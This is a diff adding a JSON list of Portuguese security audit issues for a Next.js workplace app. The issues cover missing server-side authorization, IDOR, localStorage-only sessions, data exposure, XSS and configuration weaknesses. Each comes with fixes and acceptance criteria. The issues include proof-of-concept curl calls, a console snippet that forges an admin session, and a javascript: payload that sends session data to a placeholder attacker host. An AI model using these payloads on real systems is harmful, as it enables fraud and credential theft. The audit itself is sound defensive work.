+        "Existe teste de integração: sessão de usuário comum tentando se auto-promover recebe 403",
+        "A proteção de auto-alteração de privilégio passa a comparar com o e-mail da sessão"
+      ]
+    },
+    {
+      "n": 4,
+      "titulo": "[Segurança] Rotas administrativas e financeiras sem nenhuma verificação no servidor",
+      "labels": "security, severidade:crítica, broken-access-control",
+      "problema": "Agrupa as rotas privilegiadas que não fazem verificação alguma no servidor — não importam `lib/permissoes.ts` nem leem qualquer credencial. A única barreira é `ProtectedRoute requiredRole=\"admin\"`, que roda no navegador e decide a partir de `user.tipo` lido do localStorage. Chamar a API diretamente ignora a página inteira.\n\n**Rotas afetadas:**\n\n- `GET|POST /api/admin/setores` — cria e lista setores\n- `GET|PUT|DELETE /api/admin/setores/[id]` — o GET devolve nome, e-mail, cargo e status de todos os colaboradores do setor\n- `GET /api/salgados/saldo` — saldo financeiro da conta AbacatePay (disponível, pendente, bloqueado)\n- `POST /api/biblioteca/livros` e `POST /api/certificacoes` — atrás de gates `user?.tipo === \"admin\"` no frontend, sem par no servidor\n\nO caso de `/api/salgados/saldo` é agravante: além de vazar informação financeira da empresa, serve de reconhecimento para a issue 2, revelando exatamente quanto há disponível para saque.",
+      "evidencia": "`app/api/admin/setores/route.ts:119-124`\n\n```ts\nexport async function POST(req: NextRequest) {\n  try {\n    const body = await req.json();\n    const { nome, descricao } = body;\n\n    if (!nome) {\n```\n\n`app/api/admin/setores/[id]/route.ts:85-91`\n\n```ts\nexport async function DELETE(\n  req: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);\n```\n\n`app/api/salgados/saldo/route.ts:4-7`\n\n```ts\nexport async function GET() {\n  try {\n    const saldo = await consultarSaldoLoja();\n    return NextResponse.json(saldo);\n```\n\nGate correspondente que existe só no cliente — `app/biblioteca/page.tsx:562`:\n\n```tsx\n{user?.tipo === \"admin\" && (\n```",
+      "impacto": "Qualquer anônimo cria, renomeia e exclui setores da organização, lê o cadastro completo de colaboradores por setor, consulta o saldo financeiro da empresa e cadastra livros e certificações.",
+      "correcao": "Adicionar verificação de sessão e papel no início de cada handler listado. Em seguida, criar um `middleware.ts` que exija sessão válida em `/api/**` por padrão, com lista explícita de exceções (`/api/auth/**`, `/api/webhooks/**`), para que rotas novas nasçam protegidas.",
+      "criterios": [
+        "Os 5 handlers de `/api/admin/setores/**` verificam sessão e papel de admin",
+        "`GET /api/salgados/saldo` verifica sessão e papel de admin",
+        "`POST /api/biblioteca/livros` e `POST /api/certificacoes` verificam sessão e papel equivalente ao gate do frontend",
+        "Existe `middleware.ts` que exige sessão em `/api/**` com allowlist explícita",
+        "Existe teste de integração para cada rota: requisição sem sessão recebe 401"
+      ]
+    },
+    {
+      "n": 5,
+      "titulo": "[Segurança] IDOR de escrita em /api/colaboradores/[id] permite alterar CPF, e-mail e status de qualquer colaborador",
+      "labels": "security, severidade:crítica, idor",
+      "problema": "`PATCH /api/colaboradores/[id]` carrega o registro apenas para responder 404 quando ele não existe; não há nenhuma comparação entre o `id` do path e a identidade do chamador. A validação de campos é cuidadosa — nome vazio, e-mail duplicado, status fora do enum e data inválida são todos rejeitados — mas isso valida o formato, não a autorização.\n\nO frontend em `/salgados/pagar/[id]` chama a rota com `user?.id` vindo do localStorage; trocar esse número por qualquer outro no DevTools ou no curl é suficiente.",
+      "evidencia": "`app/api/colaboradores/[id]/route.ts:70-80`\n\n```ts\nconst existing = await prisma.colaboradores.findUnique({\n  where: { id },\n  select: { id: true, email: true },\n});\n\nif (!existing) {\n  return NextResponse.json(\n    { error: \"Colaborador não encontrado\" },\n    { status: 404 },\n  );\n}\n```\n\n`app/api/colaboradores/[id]/route.ts:194-198`\n\n```ts\nconst colaborador = await prisma.colaboradores.update({\n  where: { id },\n  data,\n  select: { ...COLABORADOR_SELECT_SEGURO, setores: { select: { nome: true } } },\n});\n```\n\nCampos aceitos (linhas 56-68): `document`, `country_code`, `area_code`, `number`, `nome`, `email`, `departamento`, `cargo`, `setor_id`, `status`, `data_admissao`.",
+      "impacto": "Sequestro de conta e fraude no fluxo de pagamento. Trocar o `email` de um colaborador redireciona o vínculo do login federado da Senior (`app/api/auth/senior/route.ts:87-99`). Trocar `document` (CPF) e `number` (telefone) injeta os dados do atacante na cobrança PIX gerada em `app/api/salgados/pagamentos/route.ts:96-130`, que usa exatamente esses campos como `customer`. Também permite desativar colaboradores em massa via `status: \"inativo\"`.",
+      "correcao": "Exigir sessão e restringir a alteração ao próprio registro, com exceção explícita para admins:\n\n```ts\nconst usuario = await getUsuarioAutenticado(req);\nif (!usuario) return NextResponse.json({ error: \"Não autenticado\" }, { status: 401 });\nif (usuario.id !== id && !(await ehAdmin(usuario.id))) {\n  return NextResponse.json({ error: \"Colaborador não encontrado\" }, { status: 404 });\n}\n```\n\nCampos administrativos (`status`, `setor_id`, `departamento`, `data_admissao`) devem ficar restritos a admin mesmo quando o alvo é o próprio usuário.",
+      "criterios": [
+        "PATCH responde 401 sem sessão",
+        "PATCH responde 404 quando a sessão não é do dono do registro nem de um admin",
+        "Usuário comum não consegue alterar `status`, `setor_id`, `departamento` nem `data_admissao`, nem no próprio registro",
+        "Existe teste de integração: sessão do colaborador A fazendo PATCH no id do colaborador B recebe 404",
+        "GET do mesmo arquivo recebe a mesma verificação"
+      ]
+    },
+    {
+      "n": 6,
+      "titulo": "[Segurança] IDOR permite quitar dívidas sem pagamento e apagar registros de terceiros",
+      "labels": "security, severidade:crítica, idor, financeiro",
+      "problema": "Agrupa os handlers `[id]` de dívidas, certificações, livros e empréstimos: todos operam sobre `where: { id }` sem qualquer predicado de dono nem verificação de papel.\n\nO caso mais grave é `PATCH /api/salgados/dividas/[id]`: um corpo `{\"pago\": true}` marca a dívida como quitada sem que nenhum PIX tenha sido gerado ou pago, contornando todo o fluxo AbacatePay de `lib/pagamentos.ts`. O campo `valor` também é atualizável, então a dívida pode ser zerada antes de ser quitada. Em sentido inverso, `{\"pago\": false}` decrementa `total_gasto_salgados` de terceiros.\n\n`DELETE /api/certificacoes/[id]` executa a exclusão direto, sem sequer carregar o registro antes — um laço de `id=1` até N apaga a tabela inteira.\n\n`PATCH /api/biblioteca/livros/[id]` aceita o campo `disponivel`, o que permite marcar como disponível um livro emprestado e assim contornar a checagem do DELETE (linhas 141-150).",
+      "evidencia": "`app/api/salgados/dividas/[id]/route.ts:77-90`\n\n```ts\nconst atualizada = await tx.dividas.update({\n  where: { id },\n  data: { ...data, updated_at: new Date() },\n});\n\nif (body.pago === true && !existente.pago) {\n  await tx.colaboradores.update({\n    where: { id: existente.colaborador_id },\n    data: {\n      total_gasto_salgados: { increment: existente.valor },\n      updated_at: new Date(),\n    },\n  });\n}\n```\n\n`app/api/certificacoes/[id]/route.ts:121-128`\n\n```ts\nexport async function DELETE(\n  request: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);\n    await prisma.certificacoes.delete({ where: { id } });\n```\n\n`app/api/biblioteca/emprestimos/[id]/route.ts:63-72`\n\n```ts\nconst atualizado = await tx.emprestimos.update({\n  where: { id },\n  data: {\n    data_real_devolucao: data_real_devolucao ? new Date(data_real_devolucao) : null,\n    status: status || \"devolvido\",\n    updated_at: new Date(),\n  },\n});\n```\n\nProva de conceito:\n\n```bash\ncurl -X PATCH https://<host>/api/salgados/dividas/1 \\\n  -H 'Content-Type: application/json' -d '{\"pago\": true}'\n```",
+      "impacto": "Fraude financeira direta no módulo de salgados (dívidas quitadas sem pagamento, valores adulterados, `total_gasto_salgados` manipulável), destruição do histórico de certificações — que alimenta `/api/ranking` e `/api/dashboard` — e adulteração do acervo da biblioteca.",
+      "correcao": "Incluir o predicado de posse no próprio `where` do Prisma, para que a resposta seja 404 e não vaze a existência do registro:\n\n```ts\nconst usuario = await getUsuarioAutenticado(req);\nif (!usuario) return NextResponse.json({ error: \"Não autenticado\" }, { status: 401 });\n\nconst ehAdministrador = await ehAdmin(usuario.id);\nconst escopo = ehAdministrador ? { id } : { id, colaborador_id: usuario.id };\n\nconst existente = await tx.dividas.findFirst({ where: escopo });\nif (!existente) throw new Error(\"DIVIDA_NAO_ENCONTRADA\");\n```\n\nEspecificamente para dívidas: remover `pago` e `valor` de `CAMPOS_ATUALIZAVEIS` (linha 39). O campo `pago` só deve mudar por `aplicarPagamentoConfirmado`, nunca por requisição direta do cliente.",
+      "criterios": [
+        "`pago` e `valor` foram removidos de `CAMPOS_ATUALIZAVEIS` em `app/api/salgados/dividas/[id]/route.ts:39`",
+        "Os handlers `[id]` de dívidas, certificações, livros e empréstimos exigem sessão e verificam posse ou papel de admin",
+        "A verificação de posse está no `where` da query, e a resposta para registro de terceiro é 404 (não 403)",
+        "`DELETE /api/certificacoes/[id]` carrega e verifica o registro antes de excluir",
+        "Existe teste de integração por rota: sessão do colaborador A operando sobre registro de B recebe 404",
+        "Existe teste confirmando que `PATCH /api/salgados/dividas/[id]` com `{\"pago\": true}` não quita a dívida"
+      ]
+    },
+    {
+      "n": 7,
+      "titulo": "[Segurança] Sessão apenas no localStorage: identidade e papel são editáveis pelo usuário",
+      "labels": "security, severidade:alta, auth, arquitetura",
+      "problema": "`POST /api/auth/senior` valida corretamente as credenciais contra a plataforma Senior e até sincroniza o papel no banco (linhas 101-133), mas devolve o objeto de usuário como JSON simples. Não há `Set-Cookie`, não há JWT assinado, não há registro de sessão no servidor.\n\nO objeto é persistido em `localStorage` e é a única fonte de verdade do frontend. `ProtectedRoute` e todos os gates `user?.tipo === \"admin\"` leem dali.\n\nEsta é a issue raiz: enquanto o servidor não tiver como saber quem chama, nenhuma das outras correções de autorização é implementável. Deve ser resolvida antes das issues 2, 3, 4, 5 e 6.",
+      "evidencia": "`contexts/auth-context.tsx:65-68`\n\n```ts\nsetUser(data.user);\nlocalStorage.setItem(\"user\", JSON.stringify(data.user));\nsetIsLoading(false);\nreturn true;\n```\n\n`contexts/auth-context.tsx:35-41`\n\n```ts\nuseEffect(() => {\n  const savedUser = localStorage.getItem(\"user\");\n  if (savedUser) {\n    setUser(JSON.parse(savedUser));\n  }\n  setIsLoading(false);\n}, []);\n```\n\n`app/api/auth/senior/route.ts:180-183`\n\n```ts\nreturn NextResponse.json({\n  user,\n  message: \"Login realizado com sucesso\",\n});\n```\n\nProva de conceito — no console do navegador:\n\n```js\nlocalStorage.setItem(\"user\", JSON.stringify({\n  id: 1, tipo: \"admin\", email: \"admin@empresa\", admin_permanente: true\n}));\nlocation.reload();\n```",
+      "impacto": "Não existe sessão autenticada no sentido técnico. Todo o controle de acesso do produto é decorativo. Além disso, o `accessToken` da plataforma Senior é armazenado em localStorage (`contexts/auth-context.tsx:17`), acessível a qualquer script na origem — o que transforma a issue 9 em roubo de credencial federada.",
+      "correcao": "Emitir uma sessão no servidor ao final de `/api/auth/senior`:\n\n```ts\nconst res = NextResponse.json({ user });\nres.cookies.set(\"sessao\", await assinarToken({ id: localUser.id }), {\n  httpOnly: true, secure: true, sameSite: \"lax\", path: \"/\", maxAge: 60 * 60 * 8,\n});\nreturn res;\n```\n\nCriar `lib/sessao.ts` exportando `getUsuarioAutenticado(req)`, que lê o cookie, valida a assinatura e recarrega o papel do banco — nunca do token, para que revogação de admin tenha efeito imediato. Parar de armazenar `accessToken` no localStorage.",
+      "correcao_extra": "",
+      "criterios": [
+        "`/api/auth/senior` emite cookie de sessão httpOnly, secure e sameSite",
+        "Existe `lib/sessao.ts` com `getUsuarioAutenticado(req)` usado por todos os handlers protegidos",
+        "O papel (`tipo`, `admin_permanente`) é recarregado do banco a cada requisição, não lido do token",
+        "`accessToken` da Senior não é mais gravado no localStorage",
+        "Editar o objeto `user` no localStorage não concede mais nenhum acesso real no servidor",
+        "Existe rota de logout que inválida a sessão no servidor"
+      ]
+    },
+    {
+      "n": 8,
+      "titulo": "[Segurança] Toda query de listagem e relatório devolve a base inteira, sem escopo do chamador",
+      "labels": "security, severidade:alta, data-exposure",
+      "problema": "Não existe mecanismo de isolamento por dono neste projeto: não há Row Level Security nas migrações (nenhum `ENABLE ROW LEVEL SECURITY` ou `CREATE POLICY` em `prisma/migrations/**`), não há `middleware.ts` e nenhum handler deriva identidade de credencial verificável.\n\nO filtro por `colaborador_id` existe em dívidas, certificações e empréstimos, mas vem de um query parameter escolhido pelo cliente. Quando o parâmetro é omitido, o objeto `where` fica vazio e a query retorna a tabela inteira.\n\n**Rotas afetadas:** `/api/salgados/dividas`, `/api/certificacoes`, `/api/biblioteca/emprestimos`, `/api/colaboradores`, `/api/dashboard`, `/api/ranking/colaboradores`, `/api/ranking/estatisticas`, `/api/salgados/pagamentos`, `/api/salgados/pagamentos/status`.",
+      "evidencia": "`app/api/salgados/dividas/route.ts:27-41`\n\n```ts\nconst where: Prisma.dividasWhereInput = {};\n\nif (pago === \"true\") where.pago = true;\nelse if (pago === \"false\") where.pago = false;\n\nif (colaboradorId) where.colaborador_id = Number(colaboradorId);\n```\n\n`app/api/dashboard/route.ts:89-95`\n\n```ts\nconst filtroColaborador: { setor_id?: number; id?: number } = {};\nif (setorId !== null) filtroColaborador.setor_id = setorId;\nif (colaboradorId !== null) filtroColaborador.id = colaboradorId;\nconst escopo =\n  Object.keys(filtroColaborador).length > 0\n    ? { colaboradores: filtroColaborador }\n    : {};\n```\n\n`app/api/ranking/colaboradores/route.ts:6-17` — não aceita parâmetro algum e sempre responde com a organização inteira.\n\n`app/api/salgados/dividas/route.ts:18-25` — `?motivos_only=true` devolve a lista distinta de motivos de dívida de todos os colaboradores, frequentemente com contexto pessoal em texto livre.\n\nProva de conceito:\n\n```bash\ncurl https://<host>/api/salgados/dividas      # todas as dívidas de todos\ncurl https://<host>/api/colaboradores          # todo o cadastro\ncurl https://<host>/api/ranking/colaboradores  # ranking nominal completo\n```",
+      "impacto": "Exposição integral da base a qualquer anônimo: nomes, e-mails corporativos, departamentos, cargos, histórico financeiro, motivos de dívida em texto livre, certificações e empréstimos de todos os colaboradores.",
+      "correcao": "Após a issue 7, escopar toda query pelo usuário da sessão. Onde o papel de admin justificar visão global, tornar isso explícito:\n\n```ts\nconst usuario = await getUsuarioAutenticado(req);\nif (!usuario) return NextResponse.json({ error: \"Não autenticado\" }, { status: 401 });\n\nconst escopoDono = (await ehAdmin(usuario.id)) ? {} : { colaborador_id: usuario.id };\nconst where: Prisma.dividasWhereInput = { ...escopoDono, ...filtrosDeApresentacao };\n```\n\nTratar `colaborador_id` da query como filtro de apresentação apenas, sempre aplicado *sobre* o escopo de segurança — nunca no lugar dele.",
+      "criterios": [
+        "Todas as 9 rotas listadas respondem 401 sem sessão",
+        "Usuário comum recebe apenas os próprios registros em dívidas, certificações, empréstimos e pagamentos",
+        "`/api/colaboradores`, `/api/dashboard` e `/api/ranking/**` respondem visão global apenas para admin",
+        "O `colaborador_id` da query string nunca amplia o escopo além do que a sessão permite",
+        "Existe teste de integração: sessão do colaborador A passando `?colaborador_id=<B>` não recebe dados de B"
+      ]
+    },
+    {
+      "n": 9,
+      "titulo": "[Segurança] window.open com URL de credencial não validada permite XSS via javascript:",
+      "labels": "security, severidade:média, xss",
+      "problema": "O campo `url_credencial` de certificações é gravado sem nenhuma validação de esquema, tanto no POST quanto no PATCH, e nenhuma das duas rotas exige autorização — qualquer pessoa consegue plantar o valor. No cliente, a string vai direto para `window.open`.\n\nUma URL `javascript:fetch('https://atacante/'+localStorage.getItem('user'))` executa no contexto de origem da aplicação quando um colaborador clica no botão da credencial, exfiltrando o objeto de sessão e o `accessToken` da Senior guardados em localStorage (issue 7).\n\nNota de explorabilidade: navegadores baseados em Chromium ainda executam `javascript:` em `window.open` de mesma origem; o Firefox recente bloqueia. A ausência de Content-Security-Policy (`next.config.mjs` não define `headers()`) remove a segunda linha de defesa que limitaria o destino da exfiltração.\n\nVerificado que o projeto não tem nenhuma outra superfície de XSS: não há `dangerouslySetInnerHTML`, `innerHTML`, `eval` nem `new Function` em nenhum arquivo, e não há renderização de Markdown ou HTML de usuário.",
+      "evidencia": "`app/certificacoes/page.tsx:411-421`\n\n```tsx\n{certificacao.url_credencial && (\n  <Button\n    isIconOnly\n    variant=\"outline\"\n    aria-label=\"Ver credencial\"\n    onPress={() =>\n      window.open(certificacao.url_credencial!, \"_blank\")\n    }\n  >\n```\n\n`app/api/certificacoes/route.ts:162` — gravação sem validação:\n\n```ts\nurl_credencial: url_credencial || null,\n```\n\nRelacionado — `app/biblioteca/page.tsx:737`, campo `capa` também aceita URL arbitrária, renderizada em `<img src>`. Não executa script, mas é requisitada automaticamente por todo visitante de `/biblioteca`, entregando IP, User-Agent e Referer a um host controlado pelo atacante (`next.config.mjs:7-9` desativa a otimização de imagens, então não há proxy intermediando).",
+      "impacto": "XSS armazenado com um clique, levando a roubo do objeto de sessão e do `accessToken` da plataforma Senior. No caso de `capa`, rastreamento passivo de colaboradores sem necessidade de clique.",
+      "correcao": "Validar o esquema no servidor, no POST e no PATCH de certificações e de livros:\n\n```ts\nfunction urlSegura(valor: unknown): string | null {\n  if (typeof valor !== \"string\" || !valor.trim()) return null;\n  try {\n    const url = new URL(valor);\n    if (url.protocol !== \"https:\") throw new Error();\n    return url.toString();\n  } catch {\n    throw new ErroValidação(\"Informe uma URL https válida\");\n  }\n}\n```\n\nNo cliente, trocar `window.open` por um `<a href target=\"_blank\" rel=\"noopener noreferrer\">` e validar o esquema antes de renderizar. Configurar `headers()` em `next.config.mjs` com Content-Security-Policy restringindo `connect-src` e `img-src`.",
+      "criterios": [
+        "`url_credencial` e `capa` são validados como URL https no servidor, no POST e no PATCH",
+        "Valores existentes no banco com esquema diferente de https foram migrados ou anulados",
+        "`window.open` foi substituído por `<a>` com `rel=\"noopener noreferrer\"`",
+        "`next.config.mjs` define `headers()` com Content-Security-Policy, X-Frame-Options, X-Content-Type-Options e Strict-Transport-Security",
+        "Existe teste confirmando que `javascript:alert(1)` é rejeitado com 400 no POST de certificações"
+      ]
+    },
+    {
+      "n": 10,
+      "titulo": "[Segurança] Higiene de configuração: webhook falha em aberto, sem validação de ambiente e build ignora erros",
+      "labels": "security, severidade:média, configuração",
+      "problema": "Agrupa três itens de configuração relacionados, nenhum exploravável isoladamente.\n\n**a) Assinatura do webhook falha em aberto.** Quando `ABACATEPAY_WEBHOOK_PUBLIC_KEY` não está definida — que é o estado do `.env` atual — `assinaturaValida` retorna `true` e a verificação HMAC é pulada por completo, sem log nem aviso. A defesa que resta é o segredo na query string, essa sim bem implementada com `timingSafeEqual`. O risco é que um segredo em URL vaza com mais facilidade que uma assinatura de corpo: fica em logs de servidor, referrers e histórico de proxies.\n\n**b) Sem validação de ambiente na inicialização.** `lib/prisma.ts:5` converte `undefined` na string `\"undefined\"` via template literal. A aplicação sobe e só quebra na primeira query. Nenhum ponto do projeto valida as variáveis obrigatórias no boot. O padrão correto já existe em `lib/abacatepay.ts:33-38` — só não foi aplicado a `DATABASE_URL`.\n\n**c) Build ignora erros de tipo e lint.** Com `ignoreBuildErrors`, um `npm run build` conclui mesmo com erro de tipo, anulando a rede de proteção que detectaria, por exemplo, uma função de autorização chamada com o argumento errado.",
+      "evidencia": "`app/api/webhooks/abacatepay/route.ts:22-27`\n\n```ts\nfunction assinaturaValida(corpoBruto: string, assinatura: string | null) {\n  const chavePublica = process.env.ABACATEPAY_WEBHOOK_PUBLIC_KEY?.trim();\n\n  if (!chavePublica) {\n    return true;\n  }\n```\n\n`lib/prisma.ts:5`\n\n```ts\nconst connectionString = `${process.env.DATABASE_URL}`;\n```\n\n`next.config.mjs:2-7`\n\n```js\neslint: {\n  ignoreDuringBuilds: true,\n},\ntypescript: {\n  ignoreBuildErrors: true,\n},\n```",
+      "impacto": "Defesa em profundidade ausente no único endpoint que marca dívidas como pagas; diagnóstico difícil em ambiente mal configurado; maior chance de uma regressão de segurança chegar a produção sem ser notada.",
+      "correcao": "**a)** Configurar `ABACATEPAY_WEBHOOK_PUBLIC_KEY` e inverter o retorno: sem chave, recusar a requisição (mesmo padrão já usado para `ABACATEPAY_WEBHOOK_SECRET` nas linhas 63-71).\n\n**b)** Criar `lib/env.ts` que valide na inicialização a presença de `DATABASE_URL`, `API_KEY_ABACATEPAY_V1`, `API_KEY_ABACATEPAY_V2` e `ABACATEPAY_WEBHOOK_SECRET`, lançando erro explícito.\n\n**c)** Remover `eslint.ignoreDuringBuilds` e `typescript.ignoreBuildErrors` de `next.config.mjs` e corrigir os erros que aparecerem.\n\n**Nota de higiene:** as credenciais em `.env` (Neon, Stack, AbacatePay) foram lidas durante a auditoria. O arquivo está corretamente coberto por `.env*` no `.gitignore` e a varredura do histórico git não encontrou nenhum segredo versionado, mas recomenda-se rotação como encerramento.",
+      "criterios": [
+        "`ABACATEPAY_WEBHOOK_PUBLIC_KEY` está configurada e `assinaturaValida` recusa a requisição quando a chave está ausente",
+        "Existe validação de variáveis de ambiente na inicialização cobrindo as 4 variáveis obrigatórias",
+        "`eslint.ignoreDuringBuilds` e `typescript.ignoreBuildErrors` foram removidos de `next.config.mjs`",
+        "`npm run build` passa sem erros de tipo",
+        "Credenciais de Neon, Stack e AbacatePay foram rotacionadas"
+      ]
+    }
+  ]
+}
